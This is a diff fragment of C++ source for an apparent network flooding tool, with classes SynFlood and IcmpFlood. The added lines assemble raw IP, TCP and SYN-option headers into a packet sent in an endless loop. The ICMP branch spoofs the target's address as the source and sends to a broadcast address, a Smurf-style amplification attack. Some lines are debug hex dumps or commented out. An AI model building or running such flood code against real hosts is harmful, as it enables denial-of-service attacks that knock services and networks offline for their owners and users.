@@ -142,6 +142,11 @@ void SynFlood::generate()
     syn_options_.windowScale.length=3;
     syn_options_.windowScale.shifCount=7;
 
+    //packet fill with ip, tcp, syn option
+    memcpy(packet,&iph_,sizeof(struct iphdr));
+    memcpy(packet + sizeof(struct iphdr),&tcph_,sizeof(struct tcphdr));
+    memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr),&syn_options_,sizeof(SynOptions));
+
     sockaddr_in dst_addr;
     dst_addr.sin_family=AF_INET;
     dst_addr.sin_addr.s_addr=iph_.daddr;
@@ -155,6 +160,7 @@ void SynFlood::generate()
 
     while(power_)
     {
+                    printByHexData(packet,sizeof(packet));
         //infinity send until power off
         if(sendto(raw_fd_,packet,sizeof(packet),MSG_EOR,(struct sockaddr *)&dst_addr,(socklen_t)sizeof(dst_addr))<0)
         {
@@ -211,8 +217,12 @@ void IcmpFlood::generate(int flag, char network_class)
         int broadcast = 1;
         setsockopt(raw_fd_,SOL_SOCKET,SO_BROADCAST,&broadcast,sizeof(broadcast));
         dst_addr.sin_addr.s_addr = target_ip_.get_ip_broadcast(network_class);
+//        printByHexData((uint8_t*) target_ip_.get_ip_ptr(),4);
+//        uint32_t test = target_ip_.get_ip_broadcast(network_class);
+//        printByHexData((uint8_t*)&test,4);
         iph->saddr = target_ip_.get_ip();
         iph->daddr = target_ip_.get_ip_broadcast(network_class);
+
         //TODO : Need to unset sockopt for other function
     }
 
